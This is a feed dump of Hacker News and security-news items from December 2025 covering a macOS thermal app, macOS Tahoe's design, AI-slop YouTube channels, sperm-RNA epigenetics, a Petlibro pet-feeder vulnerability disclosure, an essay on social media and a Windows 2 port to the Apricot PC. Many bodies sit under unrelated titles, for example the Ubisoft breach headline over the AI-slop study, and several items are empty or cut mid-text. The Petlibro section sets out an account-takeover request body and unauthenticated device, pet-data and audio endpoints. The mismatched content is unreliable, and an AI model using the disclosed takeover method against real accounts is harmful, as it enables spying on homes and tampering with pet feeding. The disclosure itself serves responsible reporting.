It was simpler than I expected! To make it a pure menu bar app with no dock icon, you just need to set  to  in .First approach: root helper for I explained the various approaches to get the thermal pressure level in the previous section. But when I was building the app, I discovered later on that  was publishing the thermal state to . So at first, I thought I had to use  to get useful thermal state changes. Since that unfortunately requires root access, the app needed root access too.To reduce the scope of what runs as root, I did not run the app itself as root. Instead, the app does not work by default, but it gives you the option to install a helper. It does this through an AppleScript with administrator privileges to prompt for access.The helper is just a bash script run as a launchd daemon:The bash script writes the thermal state to a file every few seconds and the app reads it every few seconds!Using the  IPC notifications Once I discovered I could use the notification system without elevated privileges, I replaced the helper by code in the app to read the value from the notification system directly. Much simpler 🎉I wanted to show the temperature and fan speed (when supported) in a little graph in the menu bar app. This would allow me to correlate the thermal state with increased temperature, for example.Stats, the open source alternative to iStat Menus, helped me use the SMC instead and get the correct values. But the SMC is a much more unstable API because each SoC has different keys to access the temperature data:Though the M3 keys seem to work on my M4 Max work MacBook Pro…I ended up using SMC first to get the accurate temperature and fall back to IOKit if SMC doesn’t work.For the graph, I wanted a compact visualization that would show me the thermal history at a glance.The graph packs three layers of information:Colored background segments for each thermal state (green for nominal, yellow for moderate, orange for heavy, red for critical)A solid line for CPU temperature with a dynamic Y-axis that adjusts to actual valuesA dashed cyan line for fan speed percentage (on Macs that have fans)I didn’t want to spend too much time making a super fancy graph system. Since it polls every two seconds, the graph gets very busy after a while. So I decided to keep it down to 10 minutes, since the thermal state history is mostly interesting short-term.I also added hover tooltips using .Adding macOS notifications I also added notifications so I get alerted when the state changes, in case I miss the menu bar icon. It can alert on specific state transitions, and optionally on recovery. This is useful to know when it’s time to kill a VS Code instance or a Docker container!It’s true that I usually already notice when the Mac is getting slow, but sometimes the Mac gets slow when it’s swapping heavily. At least now I know when it’s just too hot.Launching the app at Login Of course, I want the app to start automatically now, since it works so well!I expected that I would need to write  again, but no, it’s extremely easy to prompt the user to add a “login item” as macOS calls it, using .Since I don’t have an Apple Developer account, I can’t notarize the app, so installing it from the releases is going to require a few extra clicks in .And for Macs that disallow it entirely, building from source with Xcode is the only way. I added instructions in the README.Hope this is useful to someone else!]]></content:encoded></item><item><title>Learn computer graphics from scratch and for free</title><link>https://www.scratchapixel.com/</link><author>theusus</author><category>dev</category><pubDate>Sun, 28 Dec 2025 11:08:22 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Last Year on My Mac: Look Back in Disbelief</title><link>https://eclecticlight.co/2025/12/28/last-year-on-my-mac-look-back-in-disbelief/</link><author>vitosartori</author><category>dev</category><pubDate>Sun, 28 Dec 2025 10:12:08 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[If someone had told me 12 months ago what was going to happen this past year, I wouldn’t have believed them. Skipping swiftly past all the political, economic and social turmoil, I come to the interface changes brought in macOS Tahoe with Liquid Glass. After three months of strong feedback during beta-testing, I was disappointed when Tahoe was released on 15 September to see how little had been addressed. When 26.1 followed on 3 November it had only regressed, and 26.2 has done nothing. Here I summarise my opinions on where Tahoe’s overhaul has gone wrong.Almost all the content displayed in windows is best suited to rectangular views. Images, video, webpages and other text crave areas bounded by right angles. Gentle rounding on the corners, as in Sequoia, is fine, but the significantly increased radius enforced in Tahoe is a misfit. This either leads to cropping of contents, or reduction in size of the view and wasted space.Cropping is misleading, as seen in this enlarged view of a thumbnail image in the Finder’s Gallery view, compared to the larger version shown below. The thumbnail misrepresents what’s in the original.Among Apple’s claims for this new look is greater consistency. But two windows in the same app, both created using SwiftUI, can’t even share a common radius, as shown below in Providable running in macOS 26.2.Tahoe has also increased the size of its controls, without using that to improve their clarity. The best way to see that is in my Mallyshag demo app.This looks good in Sequoia above, but becomes a mess in Tahoe (below) because of its changed control dimensions.Those three buttons are significantly wider, so now overlap one another and are wider than the text box below. The user sees no benefit to this, though, as the text within the controls is identical.App icons need to be both distinguishable and readily recalled. The first ensures that we can tell one from another, and relies on all the visual cues we can muster, including colours, form and content. Tahoe enforces a rule that everything in the icon must be fitted inside its uniform square with rounded corners, so restricting cues to colours and contents. As a result, the icons of many bundled and other Apple apps have become harder to distinguish in a crowded Dock. Some, including Apple’s Developer app and the App Store, are indistinguishable, while others have degenerated into vague blotches.Above are most of the apps bundled in Sequoia, and below are those in Tahoe.In real life, whiteouts are dangerous because they’re so disorienting. There’s no horizon, no features in the landscape, and no clues to navigation. We see and work best in visual environments that are rich in colour and tonal contrasts. Tahoe has continued a trend for Light Mode to be bleached-out white, and Dark Mode to be a moonless night. Seeing where controls, views and contents start and end is difficult, and leaves them suspended in the whiteout.In light mode, with default transparency, tool icons and text are clearly distinguished tonally, as are some controls including buttons and checkboxes. However, text entry fields are indistinguishable from the background, and there’s a general lack of demarcation, particularly between controls and the list view below.This technique is used in watercolours to merge layers of colour diffusely, and the best description of some of the results of transparency in Liquid Glass. My examples speak for themselves, and are drawn first from Apple’s own design for System Settings.Transparency of the Search box at the top of the sidebar on the left renders it incomprehensible when it’s underlaid by scrolled navigational content.Although the view title  remains readable, bleed-through of underlying colours is confusing, distracting and aesthetically upsetting.My next examples show the same window in Providable with a selected list row being scrolled up behind what used to be a window title bar.With the window in focus, the selection colour overwhelms the traffic light controls and window title, which should read  This also draws attention to the limited width necessary to accommodate rectangular content in a window with excessively rounded corners.Out of focus the selected row is less overwhelming, but traffic lights and title have dissipated in grey blur.I’m sure that, in the right place and time, transparency effects of Liquid Glass can be visually pleasing. Not only is this the wrong time and place, but those with visual impairment can no longer remove or even reduce these effects, as the  control in Accessibility settings no longer reduces transparency in any useful way. That was one of the regressions in 26.1 that hasn’t been addressed in 26.2.macOS Tahoe’s visual interface:Fits largely rectangular contents into windows with excessively rounded corners.Enlarges controls without any functional benefit.Results in app icons being more uniform, thus less distinguishable and memorable.Fails to distinguish tools, controls and other interface elements using differences in tone, so making them harder to use.Makes a mess where transparent layers are superimposed, and won’t reduce transparency when that’s needed to render its interface more accessible.Maybe this is because I’m getting older, but that gives me the benefit of having experienced Apple’s older interfaces, with their exceptional quality and functionality.That was little more than a decade ago, in 2014. Not that I want to turn the clock back, but it would be really helpful if I could read clearly what’s on my display once again.]]></content:encoded></item><item><title>Ubisoft Rainbow Six Siege Servers Breach linked to MongoBleed Vulnerability</title><link>https://cybersecuritynews.com/ubisoft-rainbow-six-siege-servers-breached/</link><author></author><category>security</category><pubDate>Sun, 28 Dec 2025 09:43:13 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

Top  now offer courses on the use and ethics of AI in film production, and the world’s best-known brands are utilizing AI in their creative process — albeit .Sadly, others are gaming the novelty of AI’s prompt-and-go content, using these engines to churn out vast quantities of AI “slop” — the “spam” of the video-first age. Wiktionary defines a  as “Someone who is overreliant on generative AI tools such as ChatGPT; a producer of AI slop.” Along with the proliferation of “brainrot” videos online, sloppers are making it tough for principled and talented creators to get their videos seen.The main point of AI slop and brainrot videos is to grab your attention, and this type of content seems harder and harder to avoid. But exactly how prevalent is it in the grand scheme of things?  analyzed the view and subscriber counts of trending AI slop and brainrot YouTube channels to find out which ones are competing most fiercely with handmade content around the world and how much revenue the leading sloppers are making.We identified the top 100 trending YouTube channels in every country and noted the AI slop channels. Next, we used socialblade.com to retrieve the number of views, subscribers, and estimated yearly revenue for these channels and aggregated these figures for each country to deduce their popularity. We also created a new YouTube account to record the number of AI slop and brainrot videos among the first 500 YouTube Shorts we cycled through to get an idea of the new-user experience. trending AI slop channels have a combined 20.22 million subscribers — the most of any country.In , the trending AI slop channels have amassed .The AI slop channel with the most views is India’s  ().The channel has estimated annual earnings of .-based slop channel [sic] has the most subscribers of any slop channel globally ().Brainrot videos account for around  of the first 500 YouTube shorts on a new user’s feed.Spanish and South Korean AI Slop Channels Have Most Devoted ViewershipsFirst, we analyzed the 100 top trending video channels in every country to see how prevalent AI slop has become locally.We found that Spain has 20.22 million AI slop channel subscribers among its trending channels. This is despite Spain having fewer AI slop channels (eight) among its top 100 channels than countries including Pakistan (20), Egypt (14), South Korea (11) and the U.S. (nine). The U.S. has the third-most slop subscribers (14.47 million) — 28.4% fewer than Spain but 13.18% more than fourth-placed Brazil (12.56 million).Spain’s AI slop subscriber base is boosted significantly by one channel, , which had 5.87 million subscribers at the time of analysis, making it the world’s second biggest AI slop channel (see A Spanish-Language U.S. AI Slop Channel is the World’s Most-Subscribed below).Promising to strengthen “faith in Jesus through fun interactive quizzes,” the channel’s videos put the Son of God in a range of either/or scenarios where he must give the correct answer to get the better of Satan, the Grinch and others. Two other Spanish channels with over 3.5 million subscribers each focus on comedy/brainrot shorts.While Spain’s eight trending AI slop channels may have the most subscribers, South Korea’s 11 trenders have the most views: some 8.45 billion in total. This is nearly 1.6 times as many as second-placed Pakistan (5.34B), 2.5 times as many as the third-placed U.S. (3.39B) and 3.4 times as many as Spain (2.52B).South Korean AI slop channel  alone accounts for nearly a quarter of the country’s massive view count, with 2.02 billion views.  has the second-highest view count of any trending slop channel globally, and we estimate the channel’s annual ad income to be around US$4,036,500.The channel’s 140 videos typically feature photorealistic(ish) footage of wild animals being defeated by cute pets, and the URL in the bio appears to be an affiliate link to Coupang, South Korea’s largest online retailer.A Spanish-language U.S. AI Slop Channel is the World’s Most-SubscribedNext, we identified the specific channels with the most subscribers and views globally. U.S.-based [sic] has 5.95 million subscribers, making it the trending AI slop channel with the biggest following. This is only 1.4% more than (5.87M) but over 50% more than the eighth-, ninth- and tenth-most subscribed slop channels. [sic] (Fascinating Tales) has attracted some 1.28 billion views, serving up low-quality -themed videos. The channel was established in 2020, but the earliest video currently hosted is from as recently as Jan. 8, 2025.Five of the other ten trending AI slop channels with the most views are based in South Korea, with others in Egypt, Brazil and Pakistan. But the channel with the most views of all is in India.  features over 500 videos, mainly “featuring a realistic monkey in hilarious, dramatic, and heart-touching human-style situations,” Many of which are variations on identical set-ups. The channel also has around 100,000 followers on Instagram; on Facebook, the videos are attributed to a ‘digital creator’ named Surajit Karmakar.If they’re monetizing their views, channels like  may be making millions of dollars per year. But YouTube faces a dilemma over AI content. On the one hand, YouTube CEO Neal Mohan cites generative AI as the biggest game-changer for YouTube since the original “revelation” that ordinary folk wanted to watch each other’s videos, saying that generative AI can do for video what the synthesizer did for music.On the other hand, the company worries that its advertisers will feel  by having their ads attached to slop.The AI slop channels with the highest potential earnings mostly line up with the top ten for views. This is because Social Blade  based on annual views, and most of these channels’ videos have been published over the last few months. Using an average rate of revenue per 1,000 views,  has an estimated annual revenue of $4.25 million.“The genius is going to lie whether you did it in a way that was profoundly original or creative,” . “Just because the content is 75 percent AI generated doesn't make it any better or worse than a video that’s 5 percent AI generated. What's important is that it was done by a human being.” Whether those flooding the platform with auto-generated content to make a buck care about being known as creative geniuses is another matter.On A New YouTube Feed, 33% of Videos are BrainrotFinally, we simulated the experience of an untainted YouTube shorts algorithm by establishing a new YouTube account and noting the occurrence of AI slop or brainrot videos among the first 500 videos in the feed. While we were spared either of these for the first 16 videos in the feed, in total, 104 (21%) of the first 500 videos were AI-generated, and 165 (33%) of those 500 videos were brainrot.Whether this prevalence of slop and brainrot on our test feed represents the engineering of YouTube’s algorithm or the sheer proliferation of such videos that are being uploaded is a mystery that only Google can answer. But the  of YouTube’s figures for July revealed that nearly “one in 10 of the fastest growing YouTube channels globally are showing AI-generated content only.” And brainrot, like AI slop, is a mixed blessing for YouTube as a company: it may lack the soul or professionalism with which YouTube’s advertisers wish to be associated, but brainrot is moreish by design. Brainrot’s natural home is the feed, whether viewers are compelled to keep watching to “” themselves from the trials of the world around them, or to stay up to date with the potentially infinite “” of emergent brainrot subgenres, which incorporate recurring characters and themes.The term “AI slop” has been variously pinned to “” content, to AI-generated media that may have been reviewed but with minimal quality standards (like Coke’s Christmas ads), and to  AI-generated content. As  points out, the idea that only  AI media is slop propagates the idea that the rest is legitimate and the technology’s proliferation is inevitable.Part of the threat of AI slop and some forms of brainrot is in how they have been normalized and may come across as harmless fun. But slop and brainrot prey on the laziest areas of our mental faculties. Researchers have shown how the “” makes people more likely to believe in claims or imagery the more often they encounter it. AI tools make it easy for bad-faith actors to construct a fake enemy or situation that supports their underlying political beliefs or goals. , studies have shown, even when the viewer has been explicitly told that a video is fake. Meanwhile, “information of any kind, in enough quantities, becomes noise,” writes researcher and artist . The prevalence of AI slop is “a symptom of information exhaustion, and an increased human dependency on algorithmic filters to sort the world on our behalf.” And, as  notes, as this noise drowns out the signal on the web, including social networks, the value of  will rise — and so will corporate and political efforts to fabricate and manipulate trust.And this is why, rather than attending film school to study AI techniques, it may be more valuable for creators and consumers alike — especially those still in school — to double down on Media Studies.We manually researched the top 100 trending YouTube channels in every country (on playboard.co) to isolate the AI slop channels. We then used socialblade.com to retrieve the number of views, subscribers and estimated yearly revenue (using the midpoint values) for these channels.We aggregated these figures for each country's AI slop channels to get an idea of their popularity.In addition, we created a new YouTube account and recorded the number of AI slop and brainrot videos among the first 500 YouTube Shorts we cycled through to get an idea of the new-user experience.Data is correct as of October 2025.]]></content:encoded></item><item><title>Growing up in “404 Not Found”: China&apos;s nuclear city in the Gobi Desert</title><link>https://substack.com/inbox/post/182743659</link><author>Vincent_Yan404</author><category>dev</category><pubDate>Sun, 28 Dec 2025 06:43:25 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Open-Source Standoff: GitHub Freezes Rockchip’s Code After Two-Year FFmpeg License Battle</title><link>https://securityonline.info/open-source-standoff-github-freezes-rockchips-code-after-two-year-ffmpeg-license-battle/</link><author></author><category>security</category><pubDate>Sun, 28 Dec 2025 06:04:39 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

The offspring produced by these sperm cells had stress-related metabolic dysfunction as adults and bore the stress signatures in their own sperm RNA. “These changes imply a mechanistic link between sperm RNA modifications and phenotypic features in the offspring,” Mansuy’s team concluded in their paper, which has not yet been peer-reviewed.Perhaps the trickiest step to understand is how sperm-borne molecules could influence an adult’s observable traits. In one form of experiment, researchers extract all the sperm RNA from mice that have been raised under stressful or health-altering conditions. Those isolated RNAs are then injected into a zygote. Pups that emerge usually “get the dad’s phenotypes,” Conine said, suggesting that the RNAs alone confer traits from dad to offspring.But how? During early development, epigenetic processes reign. As one fertilized cell divides into two, and those cells divide again, and so on, one set of DNA instructions is dynamically and repeatedly reprogrammed. The growing body specializes into different cell types and is sculpted into a sequence of increasingly complex forms. It’s possible, then, that early epigenetic alterations to the genome could have significant downstream effects on an adult.Research out of Conine’s lab, published in 2024, showed that sperm microRNAs alter gene expression in mouse embryos. Experiments like these, he said, support the idea that offspring can inherit paternal traits via the transfer of non-DNA molecular stowaways in sperm.The recent  paper took this idea a step further by tracing a mechanism by which this can happen. A team of more than two dozen Chinese researchers focused on the epigenetic transmission of exercise benefits, homing in on a set of microRNAs that reprogram gene expression in the early embryo. These changes ultimately result in skeletal muscle adaptations in adult offspring that enhance exercise endurance. The researchers found that well-exercised mice had more of these microRNAs in their sperm than sedentary mice did. When these microRNAs were transferred into zygotes, the adults they grew into were more physically fit, with more mitochondria in skeletal muscle and higher endurance.But how did the molecules generate the exercise-positive phenotype? In experiments, the researchers found that the microRNAs suppressed a particular protein, which had the effect of boosting genes related to mitochondrial activity and metabolism.Intriguingly, the sperm of physically trained male humans also hosted higher levels of many of the same microRNAs than those of untrained cohorts. “This cross-species conservation suggests a potential role for these sperm mi[cro]RNAs in intergenerational exercise adaptations in humans,” the researchers wrote.The notion that a father’s lived experience can become recorded by his body, transmitted to his gametes and relayed to his offspring is no longer as outlandish as it once seemed. Many researchers in the field are willing to float speculative visions of what could be going on, even as they acknowledge that gaps remain.“Our hypothesis is that the epididymis ‘sees’ the world and alters the small RNAs it produces in response,” Rando said. “These RNAs are then delivered to the zygote upon fertilization and control early gene regulation and development to shape offspring health and disease.”Conine speculates that once certain RNAs make their way into the egg, they trigger “a cascade of changes in developmental gene expression that then leads to these phenotypes” of the father showing up in the next generation. Remarkably, this unfolds even though the sheer volume of the sperm’s contents is so much less than an egg’s contents, including the relative amounts of RNA.The full picture of how paternal experience and behavior might epigenetically influence offspring is not nearly in hand. Researchers are currently piecing the story together, one experiment at a time, rather than proving out every step sequentially in the same set of organisms. One of the gaps is in the characterization of what RNA and perhaps other epigenetic factors do in the zygote to modify genomic activity as it unfolds during development, Mansuy said.“We are still blind men describing for the first time different parts of the same elephant,” Chen said. “The underlying mechanism is almost certainly an orchestra of a sperm RNA code and factors beyond that.”Confirming the findings in humans would take enormous effort, but it would be key to turning these findings in mice into “informed medical advice,” Chen said. This would require well-controlled experiments following multiple generations, tracking diet, exercise, aging and environmental exposures, while also using advanced tools to decode sperm-packaged molecules — and then looking for strong correlations between the molecular and phenotypic data.Even amid the uncertainties, researchers are cautiously moving forward as they learn to believe the results of their own experiments. If they’re right, they will have discovered a new fact of life, Rando said. When he thinks about his two boys, he wonders what he might have done differently when he was younger, before they were born, that might have tweaked his RNA profile in ways that would affect them today.“We don’t know enough yet to develop guidance like that,” Rando said. “Maybe we will get there.”]]></content:encoded></item><item><title>Replacing JavaScript with Just HTML</title><link>https://www.htmhell.dev/adventcalendar/2025/27/</link><author>soheilpro</author><category>dev</category><pubDate>Sun, 28 Dec 2025 01:07:09 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[For many years now, JavaScript has been the workhorse of the web.

But the authentication bypass that lets anyone login to any account? Still working after 2+ months. For the most popular smart pet feeder company. Cool.I was looking at the Petlibro app - they make smart pet feeders, water fountains, and other IoT pet products. Millions of pet owners use these things to feed their cats and dogs remotely. What I found was... a lot.1. Authentication Bypass - Login As AnyoneThis is the big one. Their social login API at  doesn't verify OAuth tokens. It just accepts an email and a Google ID directly from the client.{
  "phoneBrand": "google",
  "thirdId": "108305632482610644204",
  "type": 3
}
And you get back a full session token, member ID, email, and everything needed to access their account:"But how do you get someone's Google ID?" Easy. Google's People API lets you look up anyone's Google ID from their email. It's public information - Google IDs are not secrets. That's exactly why you're supposed to verify the OAuth token server-side, not just trust a client-submitted ID.The entire authentication model is backwards. They're treating the Google ID like a password when it's essentially public information.This is still working as of today. They made a new endpoint that properly verifies ID tokens, but left the old vulnerable endpoint active for "legacy compatibility" - they say they are waiting until their analytics show most users have upgraded before removing it. Two months later, anyone can still take over any account that uses Google login.It's the Lovense situation all over again. "We have a fix but we're keeping the vulnerability active for legacy support." Your users' security should not be optional while you wait for upgrade metrics.2. Access Anyone's Pet DataThe pet detail endpoint  doesn't check if you own the pet. Just send any pet ID:Got a random person's pet named "Walter" - a Tuxedo cat born January 26, 2022, weighing 4.98kg, with "Moderate Appetite" and "Moderate Activity". Also got their avatar URL and member ID.3. Get Device Serial Numbers and MAC AddressesFrom the pet ID, you can get all bound devices via /device/devicePetRelation/getBoundDevices:Device serial number: MAC address: Product name: "Granary Smart Camera Feeder"Device name: "Chef Gordon Ramsay" (lol)With the serial number, you now have full control over that device.ALL device APIs accept any serial number without checking ownership. You can:Basically anything the owner can do5. Access Private Audio RecordingsPetlibro devices let owners record mealtime messages for their pets. These audio IDs are sequential and incrementing. The  endpoint lets you assign ANY audio to ANY device:Then just fetch the device info again and you get the audio URL. I grabbed 5 random people's mealtime recordings during testing. Someone could easily automate this to harvest all recordings.6. Add Yourself As Shared OwnerThe only endpoint that checks permissions is REMOVING a shared owner. But ADDING one? Wide open.You can add yourself as a shared owner to anyone's device. The response even shows the original owner's email ( - nice, an employee's device). Reported all 6 vulnerabilities with full details and screenshots. They acknowledged receipt, said they'd assess within 5 business days. They offered $500 bounty. Said they'd fix "priority issues next week, secondary issues before end of year, and third-party login issue early next year." I pushed back HARD on the timeline. The auth bypass is a complete account takeover - you can't push that to "early next year." Also asked them to reconsider the bounty given the severity (industry standard would be $3-5k for this scope). They stuck with $500, citing "startup budget constraints." Fair enough. Asked for my ACH details and said they would send right away. Sent ACH details. They sent a confidentiality letter AFTER I sent my payment info, asking me to sign it. I never agreed to any NDA. They processed the $500 payment anyway, saying they "trusted me to sign it." Multiple follow-ups asking me to sign the confidentiality letter. I didn't reply. I explicitly refused to sign. Clarified that I never agreed to any NDA, the payment was sent without a signed agreement. They confirmed "majority of issues resolved" and that the auth bypass was "fixed in the latest app version." They said they're keeping the old vulnerable endpoint active for legacy compatibility and monitoring upgrade rates, planning to enforce upgrades "within two weeks."December 27, 2025 (Today): The old vulnerable  endpoint is STILL ACTIVE. They made a new secure endpoint but left the old one working for "compatibility." Anyone can still login to any account. It's been over three weeks since they said "two weeks."Let me be clear about what happened:I reported vulnerabilities with no mention of any NDAThey offered $500 and asked for ACH details and said they would pay me right after no strings attached.AFTER I sent payment info, they sent a confidentiality letterI never replied agreeing to anythingThey sent payment anyway, saying they "trusted me to sign"They followed up 4+ times asking me to signYou can't send someone money and then claim they agreed to terms they never accepted. That's not how contracts work.Petlibro is one of the biggest smart pet feeder companies. Their products are in millions of homes. These vulnerabilities allowed:Complete account takeover of any userAccess to private audio recordings (people talking to their pets - intimate moments) - change feeding schedules, access cameras - names, breeds, health info, photosFor pet owners who travel and rely on these devices to feed their animals, a malicious actor could:Stop feeding someone's petAccess their home camerasListen to private recordingsYou fixed most of the issues. That's good. But leaving the authentication bypass endpoint active for 2+ months because you're waiting for "upgrade analytics"? That's not acceptable.You told me on December 4th that forced upgrades were coming "within two weeks." It's now December 28th - over three weeks later. The vulnerable endpoint still works. Every day you leave it active is another day any attacker can take over any account."Legacy compatibility" is not a valid reason to leave an authentication bypass live. Force the upgrade. Break old versions. Your users' security matters more than a smooth upgrade experience.Also, trying to get researchers to sign NDAs AFTER they've already reported and AFTER you've sent payment is sketchy. Don't do that.Your users trust you with access to their homes and their pets' wellbeing. Act like it.Will update once they removed the old endpoint.They emailed me saying they removed the endpoint after I told them about the blogpost]]></content:encoded></item><item><title>How we lost communication to entertainment</title><link>https://ploum.net/2025-12-15-communication-entertainment.html</link><author>8organicbits</author><category>dev</category><pubDate>Sat, 27 Dec 2025 20:15:01 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[ All our communication channels are morphed into content distribution networks. We are more and more entertained but less and less connected.A few days ago, I did a controversial blog post about Pixelfed hurting the Fediverse. I defended the theory that, in a communication network, you hurt the trust in the whole network if you create clients that arbitrarily drop messages, something that Pixelfed is doing deliberately. It gathered a lot of reactions. When I originally wrote this post, nearly one year ago, I thought that either I was missing something or Dansup, Pixelfed’s creator, was missing it. We could not both be right. But as the reactions piled in on the Fediverse, I realised that such irreconcilable opinions do not arise only from ignorance or oversight. It usually means that both parties have vastly different assumptions about the world. They don’t live in the same world.Two incompatible universesI started to see a pattern in the two kinds of reactions to my blog post.There were people like me, often above 40, who like sending emails and browsing old-fashioned websites. We think of ActivityPub as a "communication protocol" between humans. As such, anything that implies losing messages without feedback is the worst thing that could happen. Not losing messages is the top priority of a communication protocol.And then there are people like Dansup, who believe that ActivityPub is a content consumption protocol. It’s there for entertainment. You create as many accounts as the kinds of media you want to consume. Dansup himself is communicating through a Mastodon account, not a Pixelfed one. Many Pixelfed users also have a Mastodon account, and they never questioned that. They actually want multiple accounts for different use cases. On the Fediverse threads, nearly all the people defending the Pixelfed philosophy posted from Mastodon accounts. They usually boasted about having both a Mastodon and a Pixelfed account.A multiplicity of accountsTo me, the very goal of interoperability is not to force you into creating multiple accounts. Big Monopolies have managed to convince people that they need one account on each platform. This was done, on purpose, for purely unethical reasons in order to keep users captive.That brainwash/marketing is so deeply entrenched that most people cannot see an alternative anymore. It looks like a natural law: you need an account on a platform to communicate with someone on that platform. That also explains why most politicians want to "regulate" Facebook or X. They think it is impossible not to be on those platforms. They believe those platforms are "public spaces" while they truly are "private spaces trying to destroy all other public spaces in order to get a monopoly."People flock to the Fediverse with this philosophy of "one platform, one account", which makes no sense if you truly want to create a federated communication protocol like email or XMPP.But Manuel Moreale cracked it for me: the Fediverse is not a communication network. ActivityPub is not a communication protocol. The spec says it: ActivityPub is a protocol to build a "social platform" whose goal is "to deliver content." The ActivityPub protocol is a decentralised social networking protocol based upon the ActivityStreams 2.0 data format. It provides a client to server API for creating, updating and deleting content, as well as a federated server-to-server API for delivering notifications and content. (official W3C definition of ActivityPub) But aren’t social networks also communication networks? That’s what I thought. That’s how they historically were marketed. That’s what we all believed during the "Arab Spring."But that was a lie. Communication networks are not profitable. Social networks are entertainment platforms, media consumption protocols. Historically, they disguised themselves as communication platforms to attract users and keep them captive. The point was never to avoid missing a message sent from a fellow human being. The point was always to fill your time with "content."We dreamed of decentralised social networks as "email 2.0." They truly are "television 2.0."They are entertainment platforms that delegate media creation to the users themselves the same way Uber replaced taxis by having people drive others in their own car.But what was created as "ride-sharing" was in fact a way to 1) destroy competition and 2) make a shittier service while people producing the work were paid less and lost labour rights. It was never about the social!My own interpretation is that social media users don’t mind losing messages because they were raised on algorithmic platforms that did that all the time. They don’t see the point in trusting a platform because they never experienced a trusted means of communication. Now that I write it, it may also explain why instant messaging became the dominant communication medium: because if you don’t receive an immediate answer, you don’t even trust the recipient to have received your messages. In fact, even if the message was received, you don’t even trust the recipient's attention span to remember the message.Multiple studies have confirmed that we don’t remember the vast majority of what we see while doomscrolling. While the "view" was registered to increase statistics, we don’t have the slightest memory of most of that content, even after only a few seconds. It thus makes sense not to consider social media as a means of communication at all.There’s no need for a reliable communication protocol if we assume that human brains are not reliable enough to handle asynchronous messages.It’s not Dansup who is missing something. It is me who is unadapted to the current society. I understand now that Pixelfed was only following some design decisions and protocol abuses fathered by Mastodon. Pixelfed was my own "gotcha" moment because I never understood Instagram in the first place, and, in my eyes, Pixelfed was no better. But if you take that route, Mastodon is no better than Twitter. Many reactions pointed, justly, that other Fediverse tools such as PeerTube, WriteFreely, or Mobilizon were just not displaying messages at all.I didn’t consider it a big problem because they never pretended to do it in the first place. Nobody uses those tools to follow others. There’s no expectation. Those platforms are "publish only." But this is still a big flaw in the Fediverse! Someone could, using autocompletion, send a message pinging your PeerTube address and you will never see it. Try autocomplete "@ploum" from your Mastodon account and guess which suggestion is the only one that will send me a valid notification!On a more positive note, I should give credit to Dansup for announcing that Pixelfed will soon allow people to optionally "not drop" text messages.I cling to asynchronous reliable communications, but those are disappearing. I use email a lot because I see it as a true means of communication: reliable, asynchronous, decentralised, standardised, manageable offline with my own tools. But many people, even barely younger than me, tell me that email is "too formal" or "for old people" or "even worse than social network feeds."And they are probably right. I like it because I’ve learned to use it. I apply a strong inbox 0 methodology. If I don’t reply or act on your email, it is because I decided not to. I’m actively keeping my inbox clean by sharing only disposable email addresses that I disable once they start to be spammed. But for most people, their email inbox is simply one more feed full of bad advertising. They have 4 or 5 digit unread count. They scroll through their inbox like they do through their social media feeds.Boringness of communicationsThe main problem with reliable communication protocols? It is a mostly solved problem. Build simple websites, read RSS feeds, write emails. Use IRC and XMPP if you truly want real-time communication. Those are working and working great.And because of that, they are boring.Communications protocols are boring. They don’t give you that well-studied random hit of dopamine. They don’t make you addicted.They don’t make you addicted which means they are not hugely profitable and thus are not advertised. They are not new. They are not as shiny as a new app or a new random chatbot. The problem with communication protocols was never the protocol part. It’s the communication part. A few sad humans never wanted to communicate in the first place and managed to become billionaires by convincing the rest of mankind that being entertained is better than communicating with other humans.We believe that a communication network must reach a critical mass to be really useful. People stay on Facebook to "stay in touch with the majority." I don’t believe that lie anymore. I’m falling back to good old mailing lists. I’m reading the Web and Gemini while offline through Offpunk. I also handle my emails asynchronously while offline.I may be part of an endangered species.It doesn’t matter. I made peace with the fact that I will never get in touch with everyone. As long as there are people posting on their gemlogs or blogs with RSS feeds, as long as there are people willing to read my emails without automatically summarising them, there will be a place for those who want to simply communicate.

At the time, I knew nothing about it and simply bought it because it looked rad and the price was low. I had no idea that it was not IBM PC-compatible, and that there were very few programs available for it.I have been on a quest to get a modern-ish word processor and spreadsheet program for it ever since. Which eventually made me "port" Windows 2 on it. In this post, I will tell you the story of this port.A photograph of a dark grey computer with a CRT monitor - an Apricot PC - running Windows 2Please note that most of the images in this post were taken from a real green CRT, and thus their quality might vary.

If you own an Apricot PC, or want to try the port in an emulator, check out the project on sr.ht. You need an Apricot PC, PC/Xi or Xen with at least 512 kB of RAM.If you find technical details boring the heck out of you, please don't hesitate to scroll down to the screenshot section.A few words about the Apricot PC/XiIf you want a personal computer today, your general choice is between a "PC" and a "Mac". Back in the 1980s, you would have to choose between dozens or even hundreds of computer architectures, and "PC" was not necessarily the most popular choice for a computer. One of the most promising market contenders, Victor 9000, also known as Sirius 1, was released in 1981. It gained popularity in Europe, creating a niche market for "Sirius-compatible" computers. Two years later, the British company ACT released its Sirius-compatible Apricot PC.A photograph of the main board of Apricot PC/Xi, in the process of being washed.Apricot PC is a delightful computer with a great design. Its heart is Intel 8086, the older sibling of the 8088 used in the IBM PC. It uses lovely 3.5" floppy disks; and it is the first Western computer to have a 3.5" drive - before Apple Macintosh. The screen is 9 inches, 800x400 pixels, with great image fidelity. The PC/Xi model comes with a 10 megabyte Winchester hard drive, British-made Rodime RO352, the first-ever 3.5" hard drive.A photograph of the computer's display showing multiple images at once: photographs of computer chips, schematics, and oscilloscope charts.The computer is simple enough to be understood by one person in its entirety (over the course of many months of studying). There are schematics, technical manuals, BIOS reference manuals, and example code available for it, too. Its CPU is supported by Microsoft C, Turbo Pascal, and Open Watcom. It even runs MS-DOS (2.0 to 3.20), though, of course, it cannot run any IBM PC programs.The lack of IBM PC-compatibility proved to be fatal for the Apricot. The entirety of its software catalogue is less than 300 megabytes. There is only one graphical game with a soundtrack for it, and it was made in 2025.There were, of course, productivity applications for the Apricot, including Microsoft Word for DOS. But among those, only two word processors had a graphical interface: GEM Write and Microsoft Write for 